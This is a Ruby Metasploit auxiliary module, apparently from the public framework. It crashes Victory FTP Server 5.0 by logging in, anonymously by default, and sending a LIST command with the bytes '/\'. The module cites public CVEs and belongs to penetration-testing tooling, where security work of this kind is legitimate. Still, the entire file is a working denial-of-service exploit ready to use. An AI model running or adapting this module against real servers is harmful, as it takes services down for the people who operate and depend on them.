##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Victory FTP Server 5.0 LIST DoS',
        'Description' => %q{
          The Victory FTP Server v5.0 can be brought down by sending
          a very simple LIST command
        },
        'Author' => 'kris katterjohn',
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2008-2031' ],
          [ 'CVE', '2008-6829' ],
          [ 'OSVDB', '44608' ],
          [ 'EDB', '6834' ]
        ],
        'DisclosureDate' => '2008-10-24',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ], fallbacks: ['USERNAME']),
      OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ], fallbacks: ['PASSWORD'])
    ])
  end

  def run
    return unless connect_login

    print_status('Sending command...')

    # Try to wait for a response
    send_cmd(['LIST', [0x2f, 0x5c].pack('CC')])

    disconnect
  end
end
